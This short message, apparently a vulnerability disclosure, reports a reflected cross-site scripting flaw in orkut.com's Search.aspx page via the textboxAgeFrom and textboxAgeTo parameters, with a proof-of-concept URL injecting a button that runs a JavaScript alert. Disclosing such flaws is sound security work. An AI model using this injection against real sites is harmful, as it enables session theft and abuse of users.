Subject: XSS in orkut.com


Hi,
I found this little XSS thing with the search.aspx page of orkut.com.
The page uses GET method to get user criteria for searching the
profiles of people.
The fields textboxAgeFrom and textboxAgeTo in the URL are not verified
and one can inject any html code using these parameters.
Proof of concept
http://www.orkut.com/Search.aspx?q=&checkPhoto=on&dropdownLocation=1&textboxZip=&textboxAgeFrom=&textboxAgeTo=%3Cinput+type%3Dsubmit+onclick%3Djavascript%3Aalert%28%27a%27%29%3E&dropdownDating=choose&degree=radioAll&hiddenState=&hiddenCountry=91&view=&pno=1

Note: You should be logged in to orkut to access this page.
